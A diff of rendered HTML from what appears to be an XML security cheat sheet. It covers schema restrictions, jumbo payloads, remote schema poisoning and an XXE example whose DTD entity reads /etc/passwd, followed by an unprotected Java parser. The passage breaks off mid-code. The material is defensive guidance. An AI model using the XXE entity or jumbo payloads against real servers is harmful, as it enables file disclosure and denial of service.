+<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;name&quot;</span><span class="nt">&gt;</span>
+<span class="w"> </span><span class="nt">&lt;xs:simpleType&gt;</span>
+<span class="w">  </span><span class="nt">&lt;xs:restriction</span><span class="w"> </span><span class="na">base=</span><span class="s">&quot;xs:string&quot;</span><span class="nt">&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:length</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;8&quot;</span><span class="nt">/&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/xs:restriction&gt;</span>
+<span class="w"> </span><span class="nt">&lt;/xs:simpleType&gt;</span>
 <span class="nt">&lt;/xs:element&gt;</span>
 </code></pre></div>
 <h5 id="patterns">Patterns<a class="headerlink" href="#patterns" title="Permanent link">&para;</a></h5>
 <p>Certain elements or attributes may follow a specific syntax. You can add <code>pattern</code> restrictions when using XML schemas. When you want to ensure that the data complies with a specific pattern, you can create a specific definition for it. Social security numbers (SSN) may serve as a good example; they must use a specific set of characters, a specific length, and a specific <code>pattern</code>:</p>
-<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;SSN&quot;</span><span class="nt">&gt;</span>
- <span class="nt">&lt;xs:simpleType&gt;</span>
-  <span class="nt">&lt;xs:restriction</span> <span class="na">base=</span><span class="s">&quot;xs:token&quot;</span><span class="nt">&gt;</span>
-   <span class="nt">&lt;xs:pattern</span> <span class="na">value=</span><span class="s">&quot;[0-9]{3}-[0-9]{2}-[0-9]{4}&quot;</span><span class="nt">/&gt;</span>
-  <span class="nt">&lt;/xs:restriction&gt;</span>
- <span class="nt">&lt;/xs:simpleType&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;SSN&quot;</span><span class="nt">&gt;</span>
+<span class="w"> </span><span class="nt">&lt;xs:simpleType&gt;</span>
+<span class="w">  </span><span class="nt">&lt;xs:restriction</span><span class="w"> </span><span class="na">base=</span><span class="s">&quot;xs:token&quot;</span><span class="nt">&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:pattern</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;[0-9]{3}-[0-9]{2}-[0-9]{4}&quot;</span><span class="nt">/&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/xs:restriction&gt;</span>
+<span class="w"> </span><span class="nt">&lt;/xs:simpleType&gt;</span>
 <span class="nt">&lt;/xs:element&gt;</span>
 </code></pre></div>
 <p>Only numbers between <code>000-00-0000</code> and <code>999-99-9999</code> will be allowed as values for a SSN.</p>
 <h5 id="assertions">Assertions<a class="headerlink" href="#assertions" title="Permanent link">&para;</a></h5>
 <p>Assertion components constrain the existence and values of related elements and attributes on XML schemas. An element or attribute will be considered valid with regard to an assertion only if the test evaluates to true without raising any error. The variable <code>$value</code> can be used to reference the contents of the value being analyzed. The <em>Divide by Zero</em> section above referenced the potential consequences of using data types containing the zero value for denominators, proposing a data type containing only positive values. An opposite example would consider valid the entire range of numbers except zero. To avoid disclosing potential errors, values could be checked using an <code>assertion</code> disallowing the number zero:</p>
-<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;denominator&quot;</span><span class="nt">&gt;</span>
- <span class="nt">&lt;xs:simpleType&gt;</span>
-  <span class="nt">&lt;xs:restriction</span> <span class="na">base=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">&gt;</span>
-   <span class="nt">&lt;xs:assertion</span> <span class="na">test=</span><span class="s">&quot;$value != 0&quot;</span><span class="nt">/&gt;</span>
-  <span class="nt">&lt;/xs:restriction&gt;</span>
- <span class="nt">&lt;/xs:simpleType&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;denominator&quot;</span><span class="nt">&gt;</span>
+<span class="w"> </span><span class="nt">&lt;xs:simpleType&gt;</span>
+<span class="w">  </span><span class="nt">&lt;xs:restriction</span><span class="w"> </span><span class="na">base=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:assertion</span><span class="w"> </span><span class="na">test=</span><span class="s">&quot;$value != 0&quot;</span><span class="nt">/&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/xs:restriction&gt;</span>
+<span class="w"> </span><span class="nt">&lt;/xs:simpleType&gt;</span>
 <span class="nt">&lt;/xs:element&gt;</span>
 </code></pre></div>
 <p>The assertion guarantees that the <code>denominator</code> will not contain the value zero as a valid number and also allows negative numbers to be a valid denominator.</p>
 <h5 id="occurrences">Occurrences<a class="headerlink" href="#occurrences" title="Permanent link">&para;</a></h5>
 <p>The consequences of not defining a maximum number of occurrences could be worse than coping with the consequences of what may happen when receiving extreme numbers of items to be processed. Two attributes specify minimum and maximum limits: <code>minOccurs</code> and <code>maxOccurs</code>. The default value for both the <code>minOccurs</code> and the <code>maxOccurs</code> attributes is <code>1</code>, but certain elements may require other values. For instance, if a value is optional, it could contain a <code>minOccurs</code> of 0, and if there is no limit on the maximum amount, it could contain a <code>maxOccurs</code> of <code>unbounded</code>, as in the following example:</p>
-<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:schema</span> <span class="na">xmlns:xs=</span><span class="s">&quot;http://www.w3.org/2001/XMLSchema&quot;</span><span class="nt">&gt;</span>
- <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;operation&quot;</span><span class="nt">&gt;</span>
-  <span class="nt">&lt;xs:complexType&gt;</span>
-   <span class="nt">&lt;xs:sequence&gt;</span>
-    <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;buy&quot;</span> <span class="na">maxOccurs=</span><span class="s">&quot;unbounded&quot;</span><span class="nt">&gt;</span>
-     <span class="nt">&lt;xs:complexType&gt;</span>
-      <span class="nt">&lt;xs:all&gt;</span>
-       <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;id&quot;</span> <span class="na">type=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">/&gt;</span>
-       <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;price&quot;</span> <span class="na">type=</span><span class="s">&quot;xs:decimal&quot;</span><span class="nt">/&gt;</span>
-       <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;quantity&quot;</span> <span class="na">type=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">/&gt;</span>
-      <span class="nt">&lt;/xs:all&gt;</span>
-     <span class="nt">&lt;/xs:complexType&gt;</span>
-    <span class="nt">&lt;/xs:element&gt;</span>
-  <span class="nt">&lt;/xs:complexType&gt;</span>
- <span class="nt">&lt;/xs:element&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:schema</span><span class="w"> </span><span class="na">xmlns:xs=</span><span class="s">&quot;http://www.w3.org/2001/XMLSchema&quot;</span><span class="nt">&gt;</span>
+<span class="w"> </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;operation&quot;</span><span class="nt">&gt;</span>
+<span class="w">  </span><span class="nt">&lt;xs:complexType&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:sequence&gt;</span>
+<span class="w">    </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;buy&quot;</span><span class="w"> </span><span class="na">maxOccurs=</span><span class="s">&quot;unbounded&quot;</span><span class="nt">&gt;</span>
+<span class="w">     </span><span class="nt">&lt;xs:complexType&gt;</span>
+<span class="w">      </span><span class="nt">&lt;xs:all&gt;</span>
+<span class="w">       </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;id&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">/&gt;</span>
+<span class="w">       </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;price&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:decimal&quot;</span><span class="nt">/&gt;</span>
+<span class="w">       </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;quantity&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">/&gt;</span>
+<span class="w">      </span><span class="nt">&lt;/xs:all&gt;</span>
+<span class="w">     </span><span class="nt">&lt;/xs:complexType&gt;</span>
+<span class="w">    </span><span class="nt">&lt;/xs:element&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/xs:complexType&gt;</span>
+<span class="w"> </span><span class="nt">&lt;/xs:element&gt;</span>
 <span class="nt">&lt;/xs:schema&gt;</span>
 </code></pre></div>
 <p>The previous schema includes a root element named <code>operation</code>, which can contain an unlimited (<code>unbounded</code>) amount of buy elements. This is a common finding, since developers do not normally want to restrict maximum numbers of occurrences. Applications using limitless occurrences should test what happens when they receive an extremely large amount of elements to be processed. Since computational resources are limited, the consequences should be analyzed and eventually a maximum number ought to be used instead of an <code>unbounded</code> value.</p>
@@ -2619,12 +2619,12 @@
 <li>Width attack: using a huge number of attributes, attribute names, and/or attribute values.</li>
 </ul>
 <p>In most cases, the overall result will be a huge document. This is a short example of what this looks like:</p>
-<div class="highlight"><pre><span></span><code><span class="nt">&lt;SOAPENV:ENVELOPE</span> <span class="na">XMLNS:SOAPENV=</span><span class="s">&quot;HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/&quot;</span>
-                  <span class="na">XMLNS:EXT=</span><span class="s">&quot;HTTP://COM/IBM/WAS/WSSAMPLE/SEI/ECHO/B2B/EXTERNAL&quot;</span><span class="nt">&gt;</span>
- <span class="nt">&lt;SOAPENV:HEADER</span> <span class="na">LARGENAME1=</span><span class="s">&quot;LARGEVALUE&quot;</span>
-                 <span class="na">LARGENAME2=</span><span class="s">&quot;LARGEVALUE2&quot;</span>
-                 <span class="na">LARGENAME3=</span><span class="s">&quot;LARGEVALUE3&quot;</span> <span class="err">…</span><span class="nt">&gt;</span>
- ...
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;SOAPENV:ENVELOPE</span><span class="w"> </span><span class="na">XMLNS:SOAPENV=</span><span class="s">&quot;HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/&quot;</span>
+<span class="w">                  </span><span class="na">XMLNS:EXT=</span><span class="s">&quot;HTTP://COM/IBM/WAS/WSSAMPLE/SEI/ECHO/B2B/EXTERNAL&quot;</span><span class="nt">&gt;</span>
+<span class="w"> </span><span class="nt">&lt;SOAPENV:HEADER</span><span class="w"> </span><span class="na">LARGENAME1=</span><span class="s">&quot;LARGEVALUE&quot;</span>
+<span class="w">                 </span><span class="na">LARGENAME2=</span><span class="s">&quot;LARGEVALUE2&quot;</span>
+<span class="w">                 </span><span class="na">LARGENAME3=</span><span class="s">&quot;LARGEVALUE3&quot;</span><span class="w"> </span><span class="err">…</span><span class="nt">&gt;</span>
+<span class="w"> </span>...
 </code></pre></div>
 <h4 id="small-jumbo-payloads">"Small" Jumbo Payloads<a class="headerlink" href="#small-jumbo-payloads" title="Permanent link">&para;</a></h4>
 <p>The following example is a very small document, but the results of processing this could be similar to those of processing traditional jumbo payloads. The purpose of such a small payload is that it allows an attacker to send many documents fast enough to make the application consume most or all of the available resources:</p>
@@ -2643,16 +2643,16 @@
 <div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
 <span class="cp">&lt;!DOCTYPE note [</span>
 <span class="cp"> &lt;!ELEMENT note (to,from,heading,body)&gt;</span>
- <span class="cp">&lt;!ELEMENT to (#PCDATA)&gt;</span>
- <span class="cp">&lt;!ELEMENT from (#PCDATA)&gt;</span>
- <span class="cp">&lt;!ELEMENT heading (#PCDATA)&gt;</span>
- <span class="cp">&lt;!ELEMENT body (#PCDATA)&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ELEMENT to (#PCDATA)&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ELEMENT from (#PCDATA)&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ELEMENT heading (#PCDATA)&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ELEMENT body (#PCDATA)&gt;</span>
 ]&gt;
 <span class="nt">&lt;note&gt;</span>
- <span class="nt">&lt;to&gt;</span>Tove<span class="nt">&lt;/to&gt;</span>
- <span class="nt">&lt;from&gt;</span>Jani<span class="nt">&lt;/from&gt;</span>
- <span class="nt">&lt;heading&gt;</span>Reminder<span class="nt">&lt;/heading&gt;</span>
- <span class="nt">&lt;body&gt;</span>Don&#39;t forget me this weekend<span class="nt">&lt;/body&gt;</span>
+<span class="w"> </span><span class="nt">&lt;to&gt;</span>Tove<span class="nt">&lt;/to&gt;</span>
+<span class="w"> </span><span class="nt">&lt;from&gt;</span>Jani<span class="nt">&lt;/from&gt;</span>
+<span class="w"> </span><span class="nt">&lt;heading&gt;</span>Reminder<span class="nt">&lt;/heading&gt;</span>
+<span class="w"> </span><span class="nt">&lt;body&gt;</span>Don&#39;t<span class="w"> </span>forget<span class="w"> </span>me<span class="w"> </span>this<span class="w"> </span>weekend<span class="nt">&lt;/body&gt;</span>
 <span class="nt">&lt;/note&gt;</span>
 </code></pre></div>
 <p>All restrictions on the note element could be removed or altered, allowing the sending of any type of data to the server. Furthermore, if the server is processing external entities, the attacker could use the schema, for example, to read remote files from the server. This type of schema only serves as a suggestion for sending a document, but it must contain a way to check the embedded schema integrity to be used safely. Attacks through embedded schemas are commonly used to exploit external entity expansions. Embedded XML schemas can also assist in port scans of internal hosts or brute force attacks.</p>
@@ -2660,10 +2660,10 @@
 <p>You can often circumvent the risk of using remotely tampered versions by processing a local schema.</p>
 <div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span>
 <span class="nt">&lt;note&gt;</span>
- <span class="nt">&lt;to&gt;</span>Tove<span class="nt">&lt;/to&gt;</span>
- <span class="nt">&lt;from&gt;</span>Jani<span class="nt">&lt;/from&gt;</span>
- <span class="nt">&lt;heading&gt;</span>Reminder<span class="nt">&lt;/heading&gt;</span>
- <span class="nt">&lt;body&gt;</span>Don&#39;t forget me this weekend<span class="nt">&lt;/body&gt;</span>
+<span class="w"> </span><span class="nt">&lt;to&gt;</span>Tove<span class="nt">&lt;/to&gt;</span>
+<span class="w"> </span><span class="nt">&lt;from&gt;</span>Jani<span class="nt">&lt;/from&gt;</span>
+<span class="w"> </span><span class="nt">&lt;heading&gt;</span>Reminder<span class="nt">&lt;/heading&gt;</span>
+<span class="w"> </span><span class="nt">&lt;body&gt;</span>Don&#39;t<span class="w"> </span>forget<span class="w"> </span>me<span class="w"> </span>this<span class="w"> </span>weekend<span class="nt">&lt;/body&gt;</span>
 <span class="nt">&lt;/note&gt;</span>
 </code></pre></div>
 <p>However, if the local schema does not contain the correct permissions, an internal attacker could alter the original restrictions. The following line exemplifies a schema using permissions that allow any user to make modifications:</p>
@@ -2676,10 +2676,10 @@
 <p>When documents reference remote schemas using the unencrypted Hypertext Transfer Protocol (HTTP), the communication is performed in plain text and an attacker could easily tamper with traffic. When XML documents reference remote schemas using an HTTP connection, the connection could be sniffed and modified before reaching the end user:</p>
 <div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE note SYSTEM &quot;http://example.com/note.dtd&quot;&gt;</span>
 <span class="nt">&lt;note&gt;</span>
- <span class="nt">&lt;to&gt;</span>Tove<span class="nt">&lt;/to&gt;</span>
- <span class="nt">&lt;from&gt;</span>Jani<span class="nt">&lt;/from&gt;</span>
- <span class="nt">&lt;heading&gt;</span>Reminder<span class="nt">&lt;/heading&gt;</span>
- <span class="nt">&lt;body&gt;</span>Don&#39;t forget me this weekend<span class="nt">&lt;/body&gt;</span>
+<span class="w"> </span><span class="nt">&lt;to&gt;</span>Tove<span class="nt">&lt;/to&gt;</span>
+<span class="w"> </span><span class="nt">&lt;from&gt;</span>Jani<span class="nt">&lt;/from&gt;</span>
+<span class="w"> </span><span class="nt">&lt;heading&gt;</span>Reminder<span class="nt">&lt;/heading&gt;</span>
+<span class="w"> </span><span class="nt">&lt;body&gt;</span>Don&#39;t<span class="w"> </span>forget<span class="w"> </span>me<span class="w"> </span>this<span class="w"> </span>weekend<span class="nt">&lt;/body&gt;</span>
 <span class="nt">&lt;/note&gt;</span>
 </code></pre></div>
 <p>The remote file <code>note.dtd</code> could be susceptible to tampering when transmitted using the unencrypted HTTP protocol. One tool available to facilitate this type of attack is mitmproxy .</p>
@@ -2687,12 +2687,12 @@
 <p>Remote schema poisoning may also be possible even when using encrypted protocols like Hypertext Transfer Protocol Secure (HTTPS). When software performs reverse Domain Name System (DNS) resolution on an IP address to obtain the hostname, it may not properly ensure that the IP address is truly associated with the hostname. In this case, the software enables an attacker to redirect content to their own Internet Protocol (IP) addresses.</p>
 <p>The previous example referenced the host <code>example.com</code> using an unencrypted protocol.</p>
 <p>When switching to HTTPS, the location of the remote schema will look like <code>https://example/note.dtd</code>. In a normal scenario, the IP of <code>example.com</code> resolves to <code>1.1.1.1</code>:</p>
-<div class="highlight"><pre><span></span><code>$ host example.com
-example.com has address <span class="m">1</span>.1.1.1
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>host<span class="w"> </span>example.com
+example.com<span class="w"> </span>has<span class="w"> </span>address<span class="w"> </span><span class="m">1</span>.1.1.1
 </code></pre></div>
 <p>If an attacker compromises the DNS being used, the previous hostname could now point to a new, different IP controlled by the attacker <code>2.2.2.2</code>:</p>
-<div class="highlight"><pre><span></span><code>$ host example.com
-example.com has address <span class="m">2</span>.2.2.2
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>host<span class="w"> </span>example.com
+example.com<span class="w"> </span>has<span class="w"> </span>address<span class="w"> </span><span class="m">2</span>.2.2.2
 </code></pre></div>
 <p>When accessing the remote file, the victim may be actually retrieving the contents of a location controlled by an attacker.</p>
 <h5 id="evil-employee-attack">Evil Employee Attack<a class="headerlink" href="#evil-employee-attack" title="Permanent link">&para;</a></h5>
@@ -2704,10 +2704,10 @@ example.com has address <span class="m">2</span>.2.2.2
 <p><strong>Sample XML</strong>:</p>
 <div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE contacts SYSTEM &quot;contacts.dtd&quot;&gt;</span>
 <span class="nt">&lt;contacts&gt;</span>
- <span class="nt">&lt;contact&gt;</span>
-  <span class="nt">&lt;firstname&gt;</span>John<span class="nt">&lt;/firstname&gt;</span>
-  <span class="nt">&lt;lastname&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/lastname&gt;</span>
- <span class="nt">&lt;/contact&gt;</span>
+<span class="w"> </span><span class="nt">&lt;contact&gt;</span>
+<span class="w">  </span><span class="nt">&lt;firstname&gt;</span>John<span class="nt">&lt;/firstname&gt;</span>
+<span class="w">  </span><span class="nt">&lt;lastname&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/lastname&gt;</span>
+<span class="w"> </span><span class="nt">&lt;/contact&gt;</span>
 <span class="nt">&lt;/contacts&gt;</span>
 </code></pre></div>
 <p><strong>Sample DTD</strong>:</p>
@@ -2718,168 +2718,168 @@ example.com has address <span class="m">2</span>.2.2.2
 <span class="cp">&lt;!ENTITY xxe SYSTEM &quot;/etc/passwd&quot;&gt;</span>
 </code></pre></div>
 <h5 id="xxe-using-dom">XXE using DOM<a class="headerlink" href="#xxe-using-dom" title="Permanent link">&para;</a></h5>
-<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w"></span>
-<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.parsers.DocumentBuilder</span><span class="p">;</span><span class="w"></span>
-<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.parsers.DocumentBuilderFactory</span><span class="p">;</span><span class="w"></span>
-<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.parsers.ParserConfigurationException</span><span class="p">;</span><span class="w"></span>
-<span class="kn">import</span><span class="w"> </span><span class="nn">org.xml.sax.InputSource</span><span class="p">;</span><span class="w"></span>
-<span class="kn">import</span><span class="w"> </span><span class="nn">org.w3c.dom.Document</span><span class="p">;</span><span class="w"></span>
-<span class="kn">import</span><span class="w"> </span><span class="nn">org.w3c.dom.Element</span><span class="p">;</span><span class="w"></span>
-<span class="kn">import</span><span class="w"> </span><span class="nn">org.w3c.dom.Node</span><span class="p">;</span><span class="w"></span>
-<span class="kn">import</span><span class="w"> </span><span class="nn">org.w3c.dom.NodeList</span><span class="p">;</span><span class="w"></span>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.parsers.DocumentBuilder</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.parsers.DocumentBuilderFactory</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.parsers.ParserConfigurationException</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.xml.sax.InputSource</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.w3c.dom.Document</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.w3c.dom.Element</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.w3c.dom.Node</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.w3c.dom.NodeList</span><span class="p">;</span>
 
-<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">parseDocument</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">   </span><span class="n">DocumentBuilderFactory</span><span class="w"> </span><span class="n">factory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DocumentBuilderFactory</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span><span class="w"></span>
-<span class="w">   </span><span class="n">DocumentBuilder</span><span class="w"> </span><span class="n">builder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">factory</span><span class="p">.</span><span class="na">newDocumentBuilder</span><span class="p">();</span><span class="w"></span>
-<span class="w">   </span><span class="n">Document</span><span class="w"> </span><span class="n">doc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">builder</span><span class="p">.</span><span class="na">parse</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">InputSource</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">));</span><span class="w"></span>
-<span class="w">   </span><span class="n">NodeList</span><span class="w"> </span><span class="n">nodeList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">doc</span><span class="p">.</span><span class="na">getElementsByTagName</span><span class="p">(</span><span class="s">&quot;contact&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">   </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">nodeList</span><span class="p">.</span><span class="na">getLength</span><span class="p">();</span><span class="w"> </span><span class="n">s</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">     </span><span class="n">Node</span><span class="w"> </span><span class="n">firstNode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nodeList</span><span class="p">.</span><span class="na">item</span><span class="p">(</span><span class="n">s</span><span class="p">);</span><span class="w"></span>
-<span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">firstNode</span><span class="p">.</span><span class="na">getNodeType</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">Node</span><span class="p">.</span><span class="na">ELEMENT_NODE</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">       </span><span class="n">Element</span><span class="w"> </span><span class="n">firstElement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Element</span><span class="p">)</span><span class="w"> </span><span class="n">firstNode</span><span class="p">;</span><span class="w"></span>
-<span class="w">       </span><span class="n">NodeList</span><span class="w"> </span><span class="n">firstNameElementList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">firstElement</span><span class="p">.</span><span class="na">getElementsByTagName</span><span class="p">(</span><span class="s">&quot;firstname&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">       </span><span class="n">Element</span><span class="w"> </span><span class="n">firstNameElement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Element</span><span class="p">)</span><span class="w"> </span><span class="n">firstNameElementList</span><span class="p">.</span><span class="na">item</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
-<span class="w">       </span><span class="n">NodeList</span><span class="w"> </span><span class="n">firstName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">firstNameElement</span><span class="p">.</span><span class="na">getChildNodes</span><span class="p">();</span><span class="w"></span>
-<span class="w">       </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;First Name: &quot;</span><span class="w">  </span><span class="o">+</span><span class="w"> </span><span class="p">((</span><span class="n">Node</span><span class="p">)</span><span class="w"> </span><span class="n">firstName</span><span class="p">.</span><span class="na">item</span><span class="p">(</span><span class="mi">0</span><span class="p">)).</span><span class="na">getNodeValue</span><span class="p">());</span><span class="w"></span>
-<span class="w">       </span><span class="n">NodeList</span><span class="w"> </span><span class="n">lastNameElementList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">firstElement</span><span class="p">.</span><span class="na">getElementsByTagName</span><span class="p">(</span><span class="s">&quot;lastname&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">       </span><span class="n">Element</span><span class="w"> </span><span class="n">lastNameElement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Element</span><span class="p">)</span><span class="w"> </span><span class="n">lastNameElementList</span><span class="p">.</span><span class="na">item</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
-<span class="w">       </span><span class="n">NodeList</span><span class="w"> </span><span class="n">lastName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">lastNameElement</span><span class="p">.</span><span class="na">getChildNodes</span><span class="p">();</span><span class="w"></span>
-<span class="w">       </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;Last Name: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">((</span><span class="n">Node</span><span class="p">)</span><span class="w"> </span><span class="n">lastName</span><span class="p">.</span><span class="na">item</span><span class="p">(</span><span class="mi">0</span><span class="p">)).</span><span class="na">getNodeValue</span><span class="p">());</span><span class="w"></span>
-<span class="w">     </span><span class="p">}</span><span class="w"></span>
-<span class="w">    </span><span class="p">}</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">    </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"></span>
-<span class="w"> </span><span class="p">}</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">parseDocument</span><span class="w"> </span><span class="p">{</span>
+<span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="n">DocumentBuilderFactory</span><span class="w"> </span><span class="n">factory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DocumentBuilderFactory</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span>
+<span class="w">   </span><span class="n">DocumentBuilder</span><span class="w"> </span><span class="n">builder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">factory</span><span class="p">.</span><span class="na">newDocumentBuilder</span><span class="p">();</span>
+<span class="w">   </span><span class="n">Document</span><span class="w"> </span><span class="n">doc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">builder</span><span class="p">.</span><span class="na">parse</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">InputSource</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">));</span>
